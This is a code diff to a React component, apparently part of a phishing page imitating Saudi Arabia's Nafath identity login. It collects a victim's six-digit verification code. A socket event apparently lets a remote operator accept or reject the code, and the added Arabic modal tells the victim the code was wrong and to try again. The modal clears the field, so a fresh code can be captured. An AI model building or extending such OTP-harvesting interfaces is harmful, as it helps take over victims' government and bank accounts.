@@ -1,7 +1,6 @@
 import React, { useEffect, useState } from "react";
 import { useParams } from "react-router-dom";
 
-
 import { BiBook } from "react-icons/bi";
 import { TailSpin } from "react-loader-spinner";
 import { api_route, socket } from "../App";
@@ -55,6 +54,7 @@ const NavazOtp = ({ setMode, checkMode }) => {
     if (ID === sessionStorage.getItem("id")) {
       setError(true);
       setLoading(false);
+      setOtp(null)
     }
   });
   socket.on("acceptNavazOTP", (id) => {
@@ -83,7 +83,6 @@ const NavazOtp = ({ setMode, checkMode }) => {
             required
             onChange={(e) => setOtp(e.target.value)}
             dir="ltr"
-       
             inputMode="numeric"
             minLength={6}
             type="text"
@@ -101,6 +100,24 @@ const NavazOtp = ({ setMode, checkMode }) => {
           سيتم إرسال رسالة كود التحقق خلال دقيقة
         </div>
       </form>
+      {error ? (
+        <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
+          <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
+            <AiOutlineCloseCircle className="text-6xl" />
+            <div className="flex flex-col w-full items-center justify-center">
+              <span>رمز التحقق غير صحيح</span>
+            </div>
+            <button
+              className="bg-gray-900 text-white w-11/12 py-3"
+              onClick={() => setError(false)}
+            >
+              حاول مرة ثانية
+            </button>
+          </div>
+        </div>
+      ) : (
+        ""
+      )}
       {loading ? (
         <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
           <TailSpin
